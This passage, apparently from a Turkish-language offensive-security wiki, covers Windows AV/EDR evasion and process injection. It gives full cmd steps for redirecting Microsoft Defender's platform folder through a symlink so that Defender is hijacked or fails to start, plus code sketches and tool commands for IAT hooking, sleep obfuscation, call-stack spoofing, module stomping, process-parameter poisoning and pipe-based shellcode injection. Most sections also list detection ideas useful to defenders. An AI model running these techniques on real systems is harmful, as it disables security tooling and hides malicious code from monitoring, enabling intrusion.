- ETW/EDR telemetrisi: `CREATE_PROTECTED_PROCESS` ile oluşturulan işlemleri ve AV dışı ikili dosyaların anormal PPL düzeyi kullanımını inceleyin.

Mitigations
- WDAC/Code Integrity: hangi imzalı ikili dosyaların PPL olarak ve hangi üst süreçler tarafından çalıştırılabileceğini kısıtlayın; ClipUp'ın meşru bağlamlar dışında çağrılmasını engelleyin.
- Hizmet yönetimi: otomatik başlatılan hizmetlerin oluşturulmasını/değiştirilmesini kısıtlayın ve başlatma sırası manipülasyonunu izleyin.
- Defender tamper protection ve erken başlatma korumalarının etkin olduğundan emin olun; ikili dosya bozulmasına işaret eden başlangıç hatalarını araştırın.
- Ortamınızla uyumluysa, güvenlik araçlarını barındıran birimlerde 8.3 kısa ad üretimini devre dışı bırakmayı değerlendirin (iyice test edin).

## Platform Sürüm Klasörü Symlink Hijack'i Yoluyla Microsoft Defender'ı Sabote Etme

Windows Defender, çalışacağı platformu aşağıdaki konumun altındaki alt klasörleri listeleyerek seçer:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Sözlüksel olarak en yüksek sürüm dizgesine sahip alt klasörü (ör. `4.18.25070.5-0`) seçer ve ardından Defender hizmet süreçlerini buradan başlatır (hizmet/kayıt defteri yollarını buna göre günceller). Bu seçim, dizin sembolik bağlantıları da dahil olmak üzere dizin girdilerine güvenir. Bir yönetici, Defender'ı saldırganın yazabildiği bir yola yönlendirmek ve DLL sideloading veya hizmet kesintisi sağlamak için bundan yararlanabilir.<sup>[[21]](#references)[[22]](#references)</sup>

Preconditions
- Yerel Administrator (Platform klasörü altında dizin/sembolik bağlantı oluşturmak için gerekir)
- Yeniden başlatma veya Defender platformunun yeniden seçilmesini tetikleme olanağı (açılışta hizmetin yeniden başlatılması)
- Yalnızca yerleşik araçlar gerekir (`mklink`)

Why it works
- Defender kendi klasörlerine yazmayı engeller; ancak platform seçimi dizin girdilerine güvenir ve hedefin korumalı/güvenilir bir yola çözümlendiğini doğrulamadan sözlüksel olarak en yüksek sürümü seçer.

Step-by-step (example)
1) Mevcut platform klasörünün yazılabilir bir kopyasını hazırlayın; ör. `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Platform içinde, klasörünüzü gösteren daha yüksek sürümlü bir dizin symlink'i oluşturun:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Tetikleyici seçimi (yeniden başlatma önerilir):
```cmd
shutdown /r /t 0
```
4) MsMpEng.exe (WinDefend) işleminin yönlendirilen yoldan çalıştığını doğrulayın:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Yeni işlem yolunun `C:\TMP\AV\` altında olduğunu ve hizmet yapılandırmasının/kayıt defterinin bu konumu gösterdiğini görmelisiniz.

Post-exploitation seçenekleri
- DLL sideloading/code execution: Defender’ın işlemlerinde kod yürütmek için Defender’ın uygulama dizininden yüklediği DLL’leri bırakın/değiştirin. Yukarıdaki bölüme bakın: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Hizmeti durdurma/hizmet reddi: Sonraki başlatmada yapılandırılmış yolun çözümlenmemesi ve Defender’ın başlatılamaması için sürüm symlink’ini kaldırın:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```

> [!TIP]
> Bu tekniğin tek başına yetki yükseltme sağlamadığını unutmayın; yönetici hakları gerektirir.

## PIC ile API/IAT Hooking + Call-Stack Spoofing (Crystal Kit tarzı)

Red team'ler runtime evasion işlemlerini C2 implantından çıkarıp hedef modülün içine taşıyabilir. Bunun için modülün Import Address Table'ını (IAT) hook'layıp seçilen API'leri saldırganın kontrolündeki, konumdan bağımsız koda (PIC) yönlendirirler. Bu yaklaşım, evasion'ı birçok kitin sunduğu sınırlı API yüzeyinin (ör. CreateProcessA) ötesine taşır ve aynı korumaları BOF'lara ve post-exploitation DLL'lerine de genişletir.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Üst düzey yaklaşım
- Reflective loader kullanarak hedef modülün yanına bir PIC blob'u yerleştirin (başına eklenmiş veya eşlik eden). PIC kendi kendine yeterli ve konumdan bağımsız olmalıdır.
- Host DLL yüklenirken IMAGE_IMPORT_DESCRIPTOR'ında gezinip hedeflenen import'ların (ör. CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc) IAT girişlerini ince PIC wrapper'larına yönlendirin.
- Her PIC wrapper'ı gerçek API adresine tail-call yapmadan önce evasion işlemlerini gerçekleştirir. Yaygın evasion yöntemleri şunlardır:
  - Çağrı sırasında belleği maskeleme/maskeyi kaldırma (ör. beacon bölgelerini şifreleme, RWX→RX, sayfa adlarını/izinlerini değiştirme), ardından çağrı sonrasında eski hâline döndürme.
  - Call-stack spoofing: zararsız görünen bir stack oluşturup hedef API'ye geçiş yaparak call-stack analizinin beklenen frame'leri çözümlemesini sağlama.<sup>[[9]](#references)</sup>
- Uyumluluk için, bir Aggressor script'inin (veya eşdeğerinin) Beacon, BOF'lar ve post-ex DLL'ler için hangi API'lerin hook'lanacağını kaydedebilmesini sağlayan bir arayüz dışa aktarın.

Burada neden IAT hooking kullanılıyor?
- Hook'lanan import'u kullanan her kodla çalışır; araç kodunu değiştirmek veya belirli API'leri proxy'lemesi için Beacon'a güvenmek gerekmez.
- Post-ex DLL'lerini kapsar: LoadLibrary*'ı hook'lamak, modül yüklemelerini (ör. System.Management.Automation.dll, clr.dll) yakalayıp bu modüllerin API çağrılarına aynı maskeleme/stack evasion yöntemlerini uygulamanızı sağlar.
- CreateProcessA/W'yi wrapper'layarak call-stack tabanlı tespitlere karşı process-spawning post-ex komutlarının güvenilir biçimde kullanılmasını sağlar.

Minimal IAT hook taslağı (x64 C/C++ sözde kodu)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Notes
- Patch’i relocations/ASLR sonrasında ve import ilk kez kullanılmadan önce uygulayın. TitanLdr/AceLdr gibi reflective loader’lar, yüklenen modülün DllMain’i sırasında hooking yapıldığını gösterir.
- Wrapper’ları küçük ve PIC-safe tutun; gerçek API’yi patch’lemeden önce yakaladığınız özgün IAT değerinden veya LdrGetProcedureAddress üzerinden çözümleyin.
- PIC için RW → RX geçişleri kullanın ve writable+executable sayfalar bırakmaktan kaçının.

Call‑stack spoofing stub
- Draugr tarzı PIC stub’ları sahte bir çağrı zinciri (zararsız modüllerdeki return address’ler) oluşturur ve ardından gerçek API’ye geçiş yapar.
- Bu, Beacon/BOF’lardan hassas API’lere giden canonical stack’leri bekleyen tespitleri etkisiz kılar.
- API prologue’una girmeden önce beklenen frame’lerin içine yerleşmek için stack cutting/stack stitching teknikleriyle birlikte kullanın.

Operasyonel entegrasyon
- PIC ve hook’ların DLL yüklendiğinde otomatik olarak başlatılması için reflective loader’ı post-ex DLL’lerin başına ekleyin.
- Beacon ve BOF’ların kod değişikliği olmadan aynı evasion yolundan şeffaf biçimde yararlanması için bir Aggressor script ile hedef API’leri kaydedin.

Tespit/DFIR konuları
- IAT integrity: non-image (heap/anon) adreslerine çözümlenen girdiler; import pointer’larının periyodik olarak doğrulanması.
- Stack anomalies: yüklü image’lere ait olmayan return address’ler; non-image PIC’e ani geçişler; tutarsız RtlUserThreadStart ancestry.
- Loader telemetry: süreç içinden IAT’ye yazmalar, import thunk’larını değiştiren erken DllMain etkinliği, yükleme sırasında oluşturulan beklenmedik RX bölgeleri.
- Image-load evasion: LoadLibrary* hooking yapılıyorsa, memory masking olaylarıyla ilişkili şüpheli automation/clr assembly yüklemelerini izleyin.

İlgili yapı taşları ve örnekler
- Yükleme sırasında IAT patching yapan reflective loader’lar (örn. TitanLdr, AceLdr)
- Memory masking hook’ları (örn. simplehook) ve stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stub’ları (örn. Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Resident PICO aracılığıyla import-time IAT hook’ları

Bir reflective loader’ı kontrol ediyorsanız, özel bir resolver ile loader’ın `GetProcAddress` pointer’ını değiştirerek `ProcessImports()` **sırasında** import’ları hook’layabilirsiniz:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Geçici loader PIC kendini serbest bıraktıktan sonra da varlığını sürdüren bir **resident PICO** (persistent PIC object) oluşturun.
- Loader’ın import resolver’ını üzerine yazan bir `setup_hooks()` işlevini export edin (örn. `funcs.GetProcAddress = _GetProcAddress`).
- `_GetProcAddress` içinde ordinal import’ları atlayın ve `__resolve_hook(ror13hash(name))` gibi hash tabanlı bir hook araması kullanın. Hook varsa onu döndürün; yoksa gerçek `GetProcAddress`’e devredin.
- Hook hedeflerini link time’da Crystal Palace `addhook "MODULE$Func" "hook"` girdileriyle kaydedin. Resident PICO içinde yer aldığı için hook geçerliliğini korur.

Bu yöntem, yüklenen DLL’in code section’ını yükleme sonrası patch’lemeden **import-time IAT redirection** sağlar.

### Hedef PEB-walking kullanıyorsa hook’lanabilir import’ları zorlamak

Import-time hook’lar yalnızca işlev gerçekten hedefin IAT’sindeyse tetiklenir. Bir modül API’leri PEB-walk + hash ile çözümlüyorsa (import girdisi yoksa), loader’ın `ProcessImports()` yolunun bunları görmesi için gerçek bir import ekleyin:

- Hash’lenmiş export çözümlemesini (örn. `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) `&WaitForSingleObject` gibi doğrudan bir referansla değiştirin.
- Derleyici bir IAT girdisi üretir; böylece reflective loader import’ları çözümlerken araya girilebilir.

### `Sleep()` patch’lemeden Ekko tarzı sleep/idle obfuscation

`Sleep`’i patch’lemek yerine implantın kullandığı **gerçek wait/IPC primitive’lerini** (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`) hook’layın. Uzun beklemelerde, idle sırasında bellekteki image’i şifreleyen Ekko tarzı bir obfuscation chain içine çağrıyı sarın:<sup>[[31]](#references)[[27]](#references)</sup>

- `NtContinue`’ı hazırlanmış `CONTEXT` frame’leriyle çağıran callback’lerden oluşan bir diziyi zamanlamak için `CreateTimerQueueTimer` kullanın.
- Tipik chain (x64): image’i `PAGE_READWRITE` olarak ayarlayın → tam eşlenmiş image üzerinde `advapi32!SystemFunction032` aracılığıyla RC4 ile şifreleyin → blocking wait’i gerçekleştirin → RC4 ile şifreyi çözün → PE section’larını dolaşarak **section başına izinleri geri yükleyin** → tamamlandığını bildirin.
- `RtlCaptureContext` bir template `CONTEXT` sağlar; bunu birden fazla frame’e kopyalayın ve her adımı çağırmak için register’ları (`Rip/Rcx/Rdx/R8/R9`) ayarlayın.

Operasyonel ayrıntı: Image maskelenmişken çağıranın devam etmesi için uzun beklemelerde (örn. `WAIT_OBJECT_0`) “success” döndürün. Bu yöntem, idle pencerelerinde modülü scanner’lardan gizler ve klasik “patched `Sleep()`” imzasından kaçınır.

Tespit fikirleri (telemetry tabanlı)
- `NtContinue`’a işaret eden `CreateTimerQueueTimer` callback patlamaları.
- Büyük ve bitişik, image boyutundaki buffer’larda kullanılan `advapi32!SystemFunction032`.
- Büyük aralığı kapsayan `VirtualProtect` çağrısının ardından özel section başına izin geri yüklemesi.

### Sleep-obfuscation gadget’ları için runtime CFG kaydı

CFG etkin hedeflerde, `jmp [rbx]` veya `jmp rdi` gibi bir mid-function gadget’a yapılan ilk indirect jump, gadget modülün CFG metadata’sında bulunmadığı için genellikle sürecin `STATUS_STACK_BUFFER_OVERRUN` ile çökmesine yol açar. Ekko/Kraken tarzı chain’lerin hardened süreçlerde çalışmaya devam etmesi için:<sup>[[30]](#references)</sup>

- Chain’in kullandığı her indirect destination’ı `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` ve `CFG_CALL_TARGET_VALID` girdileriyle kaydedin.
- Yüklü image’lerdeki adresler için (`ntdll`, `kernel32`, `advapi32`), `MEMORY_RANGE_ENTRY` **image base** ile başlamalı ve **image boyutunun tamamını** kapsamalıdır.
- Manually mapped/PIC/stomped bölgelerde bunun yerine **allocation base** ve allocation size kullanın.
- Yalnızca dispatch gadget’ını değil, dolaylı olarak erişilen export’ları da (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscall’ları) ve indirect target olacak saldırgan denetimindeki executable section’ları da işaretleyin.

Bu, ROP/JOP tarzı sleep chain’lerini “yalnızca CFG olmayan süreçlerde çalışır” durumundan `explorer.exe`, browser’lar, `svchost.exe` ve `/guard:cf` ile derlenmiş diğer endpoint’lerde yeniden kullanılabilir bir primitive’e dönüştürür.

### Uyuyan thread’ler için CET-safe stack spoofing

`CONTEXT`’in tamamen değiştirilmesi gürültülüdür ve CET Shadow Stack sistemlerinde sorun çıkarabilir; çünkü spoof edilmiş `Rip`, hardware shadow stack ile uyumlu kalmalıdır. Daha güvenli bir sleep-masking yöntemi şöyledir:<sup>[[30]](#references)</sup>

- Aynı süreçteki başka bir thread’i seçin ve `NtQueryInformationThread` aracılığıyla `NT_TIB` / TEB stack sınırlarını (`StackBase`, `StackLimit`) okuyun.
- Mevcut thread’in gerçek TEB/TIB’sini yedekleyin.
- `GetThreadContext` ile gerçek uyku context’ini yakalayın.
- Spoof context’ine **yalnızca** gerçek `Rip`’i kopyalayın; spoof edilmiş `Rsp`/stack state’i olduğu gibi bırakın.
- Uyku penceresi boyunca, stack walker’ların geçerli bir stack aralığı içinde unwind etmesi için spoof thread’in `NT_TIB`’sini mevcut TEB’ye kopyalayın.
- Wait tamamlandıktan sonra özgün TIB’yi ve thread context’ini geri yükleyin.

Bu yöntem, CET ile uyumlu bir instruction pointer’ı korurken TEB stack metadata’sına güvenerek unwind’leri doğrulayan EDR stack walker’larını yanıltır.

### APC tabanlı alternatif: Kraken Mask

Timer-queue dispatch fazla imza bırakıyorsa, aynı sleep-encrypt-spoof-restore dizisi, queued APC’ler kullanılarak suspend edilmiş bir helper thread’den çalıştırılabilir:<sup>[[27]](#references)</sup>

- Entry point olarak `NtTestAlert` kullanan bir helper thread oluşturun.
- Hazırlanmış `CONTEXT` frame’lerini/APC’leri `NtQueueApcThread` ile sıraya alın ve `NtAlertResumeThread` ile çalıştırın.
- Varsayılan 64 KB thread stack’ini tüketmemek için chain state’i helper stack’i yerine heap’te saklayın.
- Start event’ini atomik olarak bildirmek ve beklemek için `NtSignalAndWaitForSingleObject` kullanın.
- Scanner’ın yarısı geri yüklenmiş bir stack’i yakalayabileceği yarış penceresini azaltmak için TIB/context’i geri yüklemeden önce ana thread’i suspend edin (`NtSuspendThread` → restore → `NtResumeThread`).

Bu yöntem, aynı RC4 masking ve stack-spoofing hedeflerini korurken `CreateTimerQueueTimer` + `NtContinue` imzasını helper-thread/APC imzasıyla değiştirir.

Ek tespit fikirleri
- Uyku, wait veya APC dispatch öncesinde `VmCfgCallTargetInformation` ile yapılan `NtSetInformationVirtualMemory` çağrıları.
- `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` veya `ConnectNamedPipe` etrafında kullanılan `GetThreadContext`/`SetThreadContext`.
- `NtQueryInformationThread` çağrısının ardından mevcut thread’in TEB/TIB stack sınırlarına doğrudan yazılması.
- Dolaylı olarak `SystemFunction032`, `VirtualProtect` veya section-permission restoration helper’larına ulaşan `NtQueueApcThread`/`NtAlertResumeThread` chain’leri.
- İmzalı modüller içindeki dispatch pivot’ları olarak `FF 23` (`jmp [rbx]`) veya `FF E7` (`jmp rdi`) gibi kısa gadget imzalarının tekrarlı kullanımı.


## Precision Module Stomping

Module stomping, belirgin private executable memory ayırmak veya yeni bir sacrificial DLL yüklemek yerine payload’ları hedef süreçte zaten eşlenmiş bir DLL’in **`.text` section’ından** çalıştırır. Üzerine yazılacak hedef, payload’ı süreçte hâlâ ihtiyaç duyulan code path’leri bozmadan barındırabilecek **yüklü, disk-backed bir image** olmalıdır.<sup>[[1]](#references)[[2]](#references)</sup>

### Güvenilir hedef seçimi

`uxtheme.dll` veya `comctl32.dll` gibi yaygın modüllere gelişigüzel stomping yapmak kırılgandır: DLL uzak süreçte yüklü olmayabilir ve yeterince büyük olmayan bir code region sürecin çökmesine neden olur. Daha güvenilir bir iş akışı:

1. Hedef süreç modüllerini listeleyin ve yalnızca önceden yüklenmiş DLL’lerin adlarından oluşan bir include list tutun.
2. Önce payload’ı oluşturun ve **tam byte size** değerini kaydedin.
3. Aday DLL’leri disk üzerinde tarayın ve PE section **`.text` `Misc_VirtualSize`** değerini payload boyutuyla karşılaştırın. Bu değer, dosya boyutundan daha önemlidir; çünkü executable section’ın **belleğe eşlendiğindeki** boyutunu yansıtır.
4. **Export Address Table (EAT)**’i ayrıştırın ve stomp başlangıç offset’i olarak export edilmiş bir işlevin RVA’sını seçin.
5. **Blast radius**’u hesaplayın: payload seçilen işlev sınırını aşarsa, bellekte arkasından gelen bitişik export’ların üzerine yazar.

Gerçek ortamda görülen tipik recon/seçim yardımcıları:

```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```

Operational notes
- Tercihen, `LoadLibrary` / beklenmeyen image load'ların telemetry'sinden kaçınmak için remote process'te **zaten yüklü** DLL'leri kullanın.
- Hedef uygulama tarafından nadiren çalıştırılan export'ları tercih edin; aksi takdirde normal code path'ler, thread oluşturulmadan önce veya sonra stomp edilmiş byte'lara erişebilir.
- Büyük implant'lar, buffer'ın tamamının injector source içinde doğru şekilde temsil edilmesi için shellcode embedding'in string literal'dan **byte-array/braced initializer** biçimine değiştirilmesini gerektirebilir.

Detection fikirleri
- Daha yaygın olan private RWX/RX allocation'lar yerine **image-backed executable page'lere** (`MEM_IMAGE`, `PAGE_EXECUTE*`) yapılan remote write'lar.
- Bellekteki byte'ları diskteki backing file ile artık eşleşmeyen export entry point'leri.
- İlk byte'ları yakın zamanda değiştirilmiş meşru bir DLL export'u içinde çalışmaya başlayan remote thread'ler veya context pivot'ları.
- DLL `.text` page'lerine yönelik, ardından thread oluşturulmasıyla sonuçlanan şüpheli `VirtualProtect(Ex)` / `WriteProcessMemory` dizileri.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3), klasik remote write yolunu (`VirtualAllocEx` + `WriteProcessMemory`) kullanmayan bir **process-injection / EDR-evasion** tekniğidir. Çalışan bir hedefe byte kopyalamak yerine, Windows'un seçili `CreateProcessW` başlangıç parametrelerini child process'e **kopyalayıp** `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`) içinde saklamasından yararlanır.<sup>[[28]](#references)[[29]](#references)</sup>

### `CreateProcessW` tarafından kopyalanan poisonable carrier'lar

Kullanışlı carrier'lar şunlardır:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (`CREATE_UNICODE_ENVIRONMENT` ile) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Pratik carrier kısıtlamaları:

- `lpCommandLine`, `CreateProcessW` için **writable memory**'yi göstermeli ve null terminator dahil en fazla **32.767 Unicode karakter** olabilir.
- `lpEnvironment`, art arda gelen `NAME=VALUE\0` string'lerinden oluşan ve fazladan bir `\0` ile sonlandırılan Unicode environment block olmalıdır.
- `lpReserved` resmî olarak ayrılmıştır; bu nedenle `ShellInfo` eşlemesi, kararlı ve belgelenmiş bir contract yerine implementation detail olarak değerlendirilmelidir.

Bu yöntem, normal process oluşturmayı **payload-transfer primitive**'ine dönüştürür. Operator, child process'i saldırganın kontrolündeki başlangıç verileriyle oluşturur ve cross-process kopyalamayı Windows'un yapmasını sağlar.

### Remote write API'leri olmadan remote lookup akışı

Child oluşturulduktan sonra, kopyalanan buffer'ı **read-only** primitive'lerle bulun:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → `PROCESS_BASIC_INFORMATION.PebBaseAddress` değerini alın
2. Remote `PEB`'i okuyun
3. `PEB.ProcessParameters` alanını izleyin
4. `RTL_USER_PROCESS_PARAMETERS` yapısını okuyun
5. Seçilen pointer'ı kullanın:
   - `parameters.CommandLine.Buffer`
   - `parameters.Environment`
   - `parameters.ShellInfo.Buffer`

Minimal akış:

```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```

### Kopyalanan parametre arabelleğini yürütme

Kopyalanan parametre bölgesi genellikle `RW`’dir, yani yürütülebilir değildir. Yaygın bir P3 zinciri şöyledir:

1. İşlemi normal şekilde oluşturun (askıya alınmış olarak değil)
2. `NtProtectVirtualMemory` / `VirtualProtectEx` ile seçilen parametre sayfasını yürütülebilir hâle getirin
3. `PROCESS_INFORMATION` içinde zaten döndürülen ana iş parçacığı tanıtıcısını yeniden kullanın
4. `NtSetContextThread` (`CONTEXT_CONTROL`, `RIP`’i üzerine yazın) ile yürütmeyi yönlendirin

Klasik thread hijacking iş akışlarından farklı olarak, bu işlem `SuspendThread` / `ResumeThread` gerektirmez; döndürülen ana iş parçacığı tanıtıcısının bağlamı doğrudan değiştirilebilir.

Bu yaklaşım, enjeksiyon için yaygın olarak izlenen çeşitli API’leri kullanmaktan kaçınır:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- çoğu zaman `SuspendThread` / `ResumeThread` de

### Null bayt sınırlaması ve aşamalı shellcode

Üç taşıyıcının da verisi **dize veya dize benzeri** olduğundan, `0x00` içeren ham bir payload aktarım sırasında kesilir. Pratik bir çözüm, sabit değerleri çalışma zamanında yeniden oluşturan ve ardından rastgele bir ikinci aşamayı yükleyen **null içermeyen bir ilk aşama** kullanmaktır.

Basit bir yöntem, XOR tabanlı sabit değer sentezidir:

```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```

Bu, ilk aşamanın taşınan parametreye null byte eklemeden stack string'leri, API argümanlarını, DLL yollarını veya ikinci aşama shellcode loader'ı oluşturmasını sağlar.

### İlk aşamadan stack tabanlı API çağrıları

İlk aşamanın `LoadLibraryA` gibi API'leri çağırması gerekiyorsa şunları yapabilir:

- string/buffer'ı hedef stack'ine push etmek
- **32-byte x64 shadow space** ayırmak
- `RCX`, `RDX`, `R8`, `R9` değerlerini sabitlere veya `RSP`'ye göreli pointer'lara ayarlamak
- çağrıdan önce `RSP`'yi **16-byte hizalı** tutmak

İkinci aşama daha sonra stack'ten bir `PAGE_READWRITE` tahsisine kopyalanabilir, `VirtualProtect` ile `PAGE_EXECUTE_READ` olarak değiştirilebilir ve doğrudan RWX tahsisinden kaçınmak için çalıştırılabilir.

### Tespit fikirleri

Yazarların belirttiği iyi avlanma fırsatları:

- **process-parameter sayfalarını executable** yapan `VirtualProtectEx` / `NtProtectVirtualMemory`
- bu koruma değişikliğini takip eden `SetThreadContext` / `NtSetContextThread`
- `PEB` ve ardından `RTL_USER_PROCESS_PARAMETERS` üzerinde uzak okuma işlemleri
- süreç oluşturma sırasında alışılmadık derecede uzun / yüksek entropili `lpCommandLine`, `lpEnvironment` veya `STARTUPINFO.lpReserved` değerleri

### Notlar

- P3, **süreçler arası bir aktarım tekniğidir**; tek başına tam bir execution primitive değildir: kopyalanan parametre hâlâ execute izni değişikliği ve bir execution redirection yöntemi gerektirir.
- `RtlCreateProcessReflection` / Dirty Vanity yazarlar tarafından değerlendirildi, ancak dahili olarak `NtWriteVirtualMemory` ve `NtCreateThreadEx` gibi şüpheli primitive'lere başvurduğu için reddedildi.

Thread description'lar aracılığıyla **mevcut** bir Windows sürecine payload aktarımı ve ardından waiting-thread return-address hijacking için bkz. [Thread Name-Calling and Waiting Thread Hijacking](windows-process-injection-thread-name-calling-waiting-thread-hijacking.md).

## Console STDIN pipe injection

Etkileşimli bir console child, **payload aktarım primitive'i** olarak da kullanılabilir. Injector, child'ın standard input'unu bir pipe'a yönlendirir ve bir marker'ın ardından shellcode gönderir. Console programı veriyi kendi özel belleğine okuduktan sonra injector bu buffer'ı bulur, executable yapar ve bir child thread'ini bu adrese yönlendirir. Bu yöntem `VirtualAllocEx` ve `WriteProcessMemory` kullanımını önler; ancak yine de genel bir EDR bypass değil, process injection'dır.<sup>[[41]](#references)</sup>

"named-pipe" açıklamasına rağmen referans uygulaması, **anonymous pipe** oluşturan `CreatePipe` işlevini çağırır. Windows, anonymous pipe'ları dahili olarak benzersiz adlı pipe nesneleriyle uygular; ancak PoC ne bir `\\.\pipe\<name>` yolu seçer ne de `CreateNamedPipe` çağırır. Varsayılan güvenlik tanımlayıcısıyla devralınabilir handle'lar oluşturur, okuma handle'ını `STARTUPINFO.hStdInput` içine yerleştirir, `STARTF_USESTDHANDLES` ayarlar ve handle inheritance etkinleştirilmiş şekilde yeni bir child başlatır. Dolayısıyla bu PoC, sağlanan console executable'ını başlatır; pipe'ını mevcut bir sürece bağlamaz.<sup>[[41]](#references)[[42]](#references)[[43]](#references)</sup>

### Referans iş akışı

Uygulama aşağıdaki zinciri kullanır:<sup>[[41]](#references)</sup>

1. Child'ın `STDIN` ve `STDOUT`'u için anonymous pipe çiftleri oluşturur. Parent tarafındaki iki handle'da inheritance özelliğini kapatır ve süreç oluşturulduktan sonra parent'taki child tarafı kopyalarını kapatır.
2. `CREATE_NEW_CONSOLE` ile `netsh.exe` veya `nslookup.exe` gibi etkileşimli bir executable başlatır. Child, yönlendirilmiş standart handle'ları devralır.
3. Tam ikili `rawData` dizisini parent tarafındaki `STDIN` handle'ı üzerinden `WriteFile` ile gönderir. Console programı byte'ları tüketir ve bir kopyasını kendi özel committed bölgelerinden birinde bırakır.
4. Child'ın adres alanını `VirtualQueryEx` ile tarar, olası `MEM_PRIVATE` bölgelerini `ReadProcessMemory` ile okur ve `rawData`'nın başındaki marker'ı arar.
5. Bulunan buffer'ın korumasını `VirtualProtectEx` ile `PAGE_EXECUTE_READWRITE` olarak değiştirir.
6. Ana thread'i belirler, askıya alır, `NtSetContextThread` ile `RIP`'yi `found_address + 0x19` olarak ayarlar ve thread'i devam ettirir.

```powershell
InjectSetConsole.exe C:\Windows\System32\netsh.exe
```

Sağlanan uygulama x64'e özeldir: `CONTEXT.Rip` değerini değiştirir ve içine gömülü payload x64 shellcode'dur. `rawData`, 25 baytlık bir işaretçiyle başlar; bu nedenle çalıştırılabilir baytlar onaltılık `0x19` offset'inde başlar. Payload'ı değiştirirken bu düzeni koruyun veya işaretçiyi, arama vektörünü, dizi boyutunu ve yürütme offset'ini birlikte güncelleyin. Kaynak yorumlarında ayrıca `0x0A`, `0x0D` ve `0x1A` bad character olarak listelenir. Bu iş akışı çocuğun token'ını veya ayrıcalıklarını değiştirmez.<sup>[[41]](#references)</sup>

Küçük native yardımcılar ve payload derleme kalıpları için bkz. [Windows C Payloads](windows-local-privilege-escalation/windows-c-payloads.md).

## Shellcode kullanmadan thread-pool callback DLL injection (DLLParty)

DLLParty, PoolParty tarzı thread-pool injection yöntemini uyarlayarak mevcut bir hedef worker'ın enjekte edilmiş bir callback stub'ını yürütmesi yerine `LoadLibraryA` çağırmasını sağlar. Dispatch primitive'i, hedef pool'un I/O completion port'una kuyruğa alınan bir `TP_DIRECT` completion'dır. Bu yöntem process permissions'ı atlatmaz: PoC, `OpenProcess(PROCESS_ALL_ACCESS)` çağırır ve okunabilir/yazılabilir hedef belleğe, ayrıca çoğaltılabilir worker-factory ve completion-port handle'larına ihtiyaç duyar.<sup>[[46]](#references)[[47]](#references)</sup>

Windows x64'te worker, stack-backed `TP_CALLBACK_INSTANCE` işaretçisini ilk callback argümanı olan `RCX` üzerinden geçirir. `LoadLibraryA` aynı işaretçiyi `LPCSTR` olarak yorumlar. Test edilen yolda `TppWorkerThread`, işaretçiyi `RSP+0x178` konumunda oluştururken bu nesneye yaptığı ilk olağan yazma işlemi `RSP+0x1d0` konumundadır. Bu nedenle, 0x58 baytlık öne sığan null-terminated bir DLL path, dispatch öncesinde üzerine yazılmadan instance'ın başlangıcında yer alabilir. Bu, belirli bir build'de gözlemlenmiştir; belgelenmiş bir Windows ABI garantisi değildir.<sup>[[46]](#references)[[47]](#references)</sup>

Referans iş akışı şöyledir:<sup>[[46]](#references)[[47]](#references)</sup>

1. `NtQuerySystemInformation(SystemHandleInformation)` ile hedefin handle'larını listeleyin ve nesne türlerini sorgulayarak `TpWorkerFactory`'yi belirleyin. Bir worker-factory handle'ını çoğaltın ve `WorkerFactoryBasicInformation`'ı sorgulayın; `StartParameter`, uzak `TP_POOL` değerini verir. `TotalWorkerCount == 0` olan factory'leri atlayın.
